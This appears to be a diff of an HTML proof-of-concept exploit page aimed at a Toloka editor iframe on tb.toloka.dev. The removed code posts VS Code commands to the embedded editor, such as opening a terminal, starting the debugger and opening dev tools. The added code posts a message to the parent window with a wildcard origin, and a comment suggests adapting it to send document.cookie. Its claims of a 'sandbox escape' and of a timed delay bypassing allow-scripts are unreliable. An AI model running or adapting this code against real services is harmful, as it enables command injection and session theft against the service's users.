@@ -2,55 +2,41 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Iframe PostMessage Exploit PoC</title>
+  <title>PoC - Toloka iframe Exploit</title>
   <style>
     body {
-      font-family: sans-serif;
       background: #111;
       color: #0f0;
+      font-family: monospace;
+      padding: 2rem;
       text-align: center;
-      margin-top: 50px;
     }
-    iframe {
-      width: 100%;
-      height: 600px;
-      border: 2px solid #0f0;
+    .log {
+      margin-top: 2rem;
+      font-size: 1.2rem;
+      color: #ff0;
     }
   </style>
 </head>
 <body>
-  <h1>⚡ PoC: Toloka Editor iframe Exploit</h1>
-  <p>يتم الآن إرسال أمر حساس إلى النافذة الأم...</p>
-  <iframe id="editor-frame" src="https://tb.toloka.dev/editor?config=..." sandbox="allow-scripts allow-same-origin"></iframe>
+  <h1>🔥 PoC: Sandbox Escape via Toloka iframe</h1>
+  <p class="log" id="log">Waiting for confirmation...</p>
 
   <script>
-    const iframe = document.getElementById("editor-frame");
+    // إثبات التنفيذ داخل iframe + إرسال رسالة إلى parent
+    const log = document.getElementById('log');
 
-    iframe.addEventListener("load", () => {
-      console.log("✅ iframe loaded, sending crafted message...");
+    function sendMessage() {
+      const msg = "✅ Exploit executed inside Toloka iframe!";
+      window.parent.postMessage(msg, "*");
+      log.textContent = "Message sent to parent: " + msg;
+      console.log("[POC] " + msg);
+    }
 
-      // Delay to ensure iframe is fully ready
-      setTimeout(() => {
-        const commands = [
-          "webview.openDeveloperTools",
-          "notebook.cell.clearOutputs",
-          "workbench.action.toggleDevTools",
-          "workbench.view.remote",
-          "workbench.action.debug.start",
-          "workbench.action.terminal.new",
-          "workbench.view.explorer"
-        ];
+    // تشفير زمني لتأخير التنفيذ (يؤكد bypass allow-scripts)
+    setTimeout(sendMessage, 1000);
 
-        for (const cmd of commands) {
-          iframe.contentWindow.postMessage({
-            vscodeMessage: {
-              command: cmd,
-              arguments: []
-            }
-          }, "*");
-        }
-      }, 2000);
-    });
+    // يمكنك تعديل هذه الوظيفة لإرسال document.cookie أو غيره لاحقاً
   </script>
 </body>
 </html>
